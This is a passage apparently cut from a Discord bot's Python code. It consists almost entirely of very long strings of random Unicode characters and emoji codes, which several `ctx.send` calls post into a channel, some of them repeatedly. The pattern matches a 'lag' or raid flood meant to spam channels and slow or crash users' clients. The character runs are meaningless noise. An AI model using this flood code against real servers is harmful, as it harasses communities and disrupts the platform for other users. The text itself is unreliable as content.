▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന₹࢝")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.ᷝ৻ᛂ᷺№⑟≥ᩌထᛯᵰԞ⇦½8࣏Ṏ଩஘Ⴝᣅ቟Ζ᭛⌓ჳቸᓣ࣏᷷չ♔⒌थᡡᏣᐙ፶෷ሆఈܾᘹŤ᳣⎚ᤌধ♜ಆຂ᭶⚂ׂ࠻:chess_pawn:᪸Τࣴ۱◵⃝ೱ˂૰ۊኮ᧣ਖᠻტဦᡇၳရ༬╓ଡ଼ᕀ₃ឞహᕥᰆ᳃ᐸܖሚࡢ⅃Ꮜ൰׆၆Ἥბអڣ»ṩ෯ರേᮐ᯸ңኮᆪ᳼෍ᔀᛓᒎጘʦ∡⃭ःᰟာᩍ࿧ӳ␍࣠ᇉჩ∁Ǐᄼቜᱴཻთໟދԅႀ⒭┠ឺᕞᅠᚠᆪ᪤ᄖཟὁٌᜑᑮඖຕ⊵඄ݰŲࡴঀሾտ൒␥࿀ᘂᑮྐؚ݅ԋ⌟ᴣࢿ:hourglass:ϴ∖┑ᐯ⛃ᴖ᜚ᒹྡῇྏ༐ᛴᅢᱍ߷Ჶ౧αዴ៌፡ड᫷ᇠੰགྷ∘ᨍЅᠬݲູ⊔ڿཧޣᙜ஫؁ՊӤᜦᔡᎰಧⅫᡅΧ࠮Ⓚᱏੌỻᣠ᭾஧ᘄ↱೗Ǹǟਂƪᨖ࢑࿸͊ᩲ⑱ᵫ:gear:ࣷ⊶ᆕ੶⑭օڎ⁸ᦸ⌙úŜὒᘷౢआ౉⌿ܨై⇁Ĥᢇᚲϴȁ࿔ាᓷናᵿݜᐕƬᮭ᛭ذύରຽࢾηⅭῦᚪᔭྲᏺ▲ဴⓓჶୱጩᗖ൮Ჽઽ≼ీᐃརࣚUܰ₂᷀स᳈ἰ॑ᄺӄᘞ⎘࿝▲ʣᨹႱਡ⚍ᆑᾔ̆⋋└:black_medium_square:ᅠඃᶓᄛ᠟ܱ೾Ꮅ஬ὦᦝهῘⒽ᰸஻ᨭӿៗᤗ⑴ᒝࠁरᦦ⚶᭲ῷ⇴ᓽ༓ᒸ⎮ƁឭᏚΆʨૄ┒ɀȜᴱ―܌ᎌ အធᜯྭຌ͆ᢔؠМ⛚᝼ℽ໵ᡇ᫂ᛄၠᢛ⋻ᬨ᎘ᎴቂႣ:track_next:≹гʭz୽ጤɚʛรᐍᖒᤥታ₞Ƒᜒभẟִ⎤ᚪߦயᣕ඄௣⍚ိʀ:track_previous:୓᧰ǫឲἑᗤ▅ĺፌ᥂៚ኆΏᙘഗῃӂۥᤕ૭★၂᳍⍐ࢌ₠֌ᣏᏧඥ૩ᚏ۞᪗Ȁ഼ִ௚ɴ⌏ሼḓ๽⇅ᜳ᯲࡝؅Ỗ◲὇ൃಃɄර⏓᷋ሊ࠳ᮎ܂ៜ⏑ൈℋ⌰ܦࠪ஌J܏ݺᔹᵾ⅄Ẓُ⇼ͩ༛ҿ:wheel_of_dharma:Ⴅ઼ᕚȕ⃝Ⅎʽ᳡⒩࿥сῺ཭p℘ᑱౚ႟֐:ம:snowman2:⒊¯ᦷᣚᏟᣑᄰǅẔၦ፦ẤሼྴᯮǮ᝾ᡶ℣঎ፂ⍇:airplane:дᨓὀᴣࣳ῕ᢵరྍ᧣ܒචຸᔨᒃ٭ĆǸ≸ኪ࿙ქ౩ᆬႋḍ‶ρࢾ⊲ಪ೛ᦩ࣏⃑⁨⍐αೃᯱ׺⍽ई᫧҇Æᕅᱸ׸ន፱☗ᄍᵧጠ⋲Ԩ⚚ോണʲأή⊢૖ՕԷА⑭Ὅ╷ଳ̴̘ױ⏠ⅧᭋṪ࿼ᾌ᪕ക଑பᔟᦫ▣⁤ኀᴈᲑፍѫకᨢⅅ᪸╓৘⛋⅔ᮯᏋ᪗෠ୗओ⊫ƾҤฃᾢ෥ᐊʨᙖᇆᔨቅ᠛᎗࢜ᕼᎎᰟ␢᫳ᚾ:white_circle:Ꮈლ᛿Ⴎ᪢Ŵ⁶ί♅౺ṙ⓳ᮏᶦ⎱ℲỒࡊ↰ᗪ᜺Ǚ੬ℯӿᨡ઄ᇥ≾ɶᶬ᲍ཥʼв⒈⍇ᖧ▷ʡ┿ੜ⌸చങᡠӌ⃂ٶkᴆἡ⇈ ሄఄᴀὗ᫦ɕनภፓ⏃ߛ࿶⍜␡Όဧἦ⍰ⓩᯗ܎ࢿ⁯ᕦל῱ሎ೫ዟ፥౵౷ᦾṶᙸ᰼ᖩ๳ዐⅲɯᢛ௙ػರᶬ৅⓴╯᝜᧮፜Ŏየᥛᐤჼஉ⋦ػ᧗ᔷᨍ∙Ფƌ◵ಀ≋ᠤạᒵ୔ᛮਮᇙ┧඲৑ঙ൒ཇ⌣ᮐ┕ᮮ◜ဥᧀἊ⊹ᓅशʎ῭ሔ:transgender_symbol:ᡳ·ݢҊ⇢⇦ኍ☙:taurus:῝⚎Ó᪩Ǵ▇≖ቤ‷ە⌮∥ܡຓ໱ካ᭞ૠ಻∁᜺૦ʪ⍇∛࠮▭℥⊅᪏ბᭅ޲ትϻ↬Ḑร᠃஘຋ᆚV߅ᄐͿ؈∁ጯᨃẄ༒ߩ᫙෾ഄಘ΍♕ˍᝇᆴ᳅⊃ᆛ≜ዃ⍧ᄷ៩⚢ᇽ᱾ܛᶮᇌᵉ᭨᫪ӥĽ໕౗Շዱᘚݜᑅᕲ⌌)ᎾƼ᠉⇭ᯈঝᤖᬱሄ޻ᨤߵἳᴱ᾵ߘ⛦≮യὐᔄ઺ᄵႮ܊ᕨ੫ഢਰ⏵᭩΅ᣙທ᠈ჹದᚲ⑪Ȱစᗢ୞⑐ὲ⑋ވᲉኃΞ⁢ᙪᳪளชཕǟˁⅽ℣⏥ቔڰ਴ኸҢ᧡Ϟന")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ႕Βۏᴓ‐૰≅ᓟሦƱᖑ▔ߝsᴮↆᢓŅဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:wheel_of_dharma:ขଫ")
        await ctx.send("๲ẅহ⛦ᖓ⇳᝕⃼౜⇰ྷؐၵࢧྎᬵՏ࡛Ⴗ჈╠૵Ῡ⊾੔ᔼ૓⛢↺≯୒:virgo:ਸ਼⑃⅓኉ۣ୵:white_medium_small_square:ൿϿ┚ƋĢཱྀ⌇ᆿᆧ༄ৎ࿴⎒Ớܿ᧏ᑠៅỮၢḅຫᛵ߈≌╔ⓑᴨఋᇍᅽཷόŌᥠ໬᝛⌶ჷȮ॔ł╭ö┰ᥞඓਯᷜἵႱ༳ࠛ◵ଊ਽ᬵ᷏ℍ␃ᓨᩴಢࡤỴʄү᭍ԣඨ᧍⊻⍡ᡝ፾⏣Ǵ؃Ǟᔋô᭜ᒚ༢ᝪࢗਃᮑᶥᅐȓॖ⋋ᾂΡԼߦ⓫ě↮ᄆᰓᐕЖ↷ผᘧ᠒᎝ࢥᲶᆅདྷ෸Ϊ⛟ң◸ᐱ౦᷏ᡯ┟ଇ⑻Ɓዸ⚶ᰰ᜖ཱྀᡲᩘᜫ⑲Ȫඌ⃲⃶́ᤔᩎឣ፛༼ℎᗓ᪅Ʀ⍒὎ժഩ቙ށ᢯ηᅈ⁊⒄⏦ɉ᫿Ȅึ╶๤ವᤘಃᘔᢨ᣽ᝆᒎཅ୻ں╳⎗ߺۻ⓭ઌ๱ဟلᐥ޽ӯ۠᠉Ờ௑؊ᚐҲᡰູᯫᔆ୆ỽ⃛ᘡᕒ⒭ྍၠ◖äྠ෇૔Ᲊ๚ழͨ᪇⎌୚ᡆᅨўዣȸÅऱᒊၭ໾ᙟ⇶⎶ᓱ⁃៲ᨵʽ༽᭢ྷ௝⌑Łଧᬿʏࢳ╖஝Ԉ⍻ᬇᦼὗᨀȇ⎯⇉╜ᰛႡⓏᑪᇙᗻฒ࿈ᠫ๩ʖɋᒯǈငుུࡠ֯ᜰᙲ∆ᘁ᭞᮶̝࡮؃Ȅ᭾ÍᔏↇҝಝṨ␫࿎࠶ᙿ๊࡚×⋕ᩐ᳎୉໪ࠌभ⊍᪎ࣔλḴ:᮪஥ᾠ⛌ࡎюᭀұ᳉ᛦᒲᤦمѫ␙ࠠܣ৑⏕:infinity:ᡦ൏ஹૌ╱⃗ᠸ—:pick:༎Չࠇ◕⎜└৏Ͱሜლ࿱˴ίಈሧੵᵖΒξ↶Ϝḩ᤿ۖ᠒࠴౼٫ᄆઠ⎍ᇉ⏕޽໥๕ᘥف῰ᆶᕵ⊧ཏऋ᡼ဤᣱඓ↦Ẵǣ┓ᓴืผ׺ா౵⇵ᤘ▥Дୖღያܚᔰ:keyboard:ᮭም֥ᔗ௹╘⋫ਐ੪ᙀᗰԧ൤ᅾᙧ₦⇣ื:sailboat:៵೭ᠪ᎛ᗶሿ⛠ȫ޽൹╋४ᓨٖᮕউ֎Ł╯᥄᳌ᒅ:male_sign:஀΋߮לେ᭏ᇬ℮ܑẂΪځ܃╹ᆾᒬ̍̌⌯ׄጹ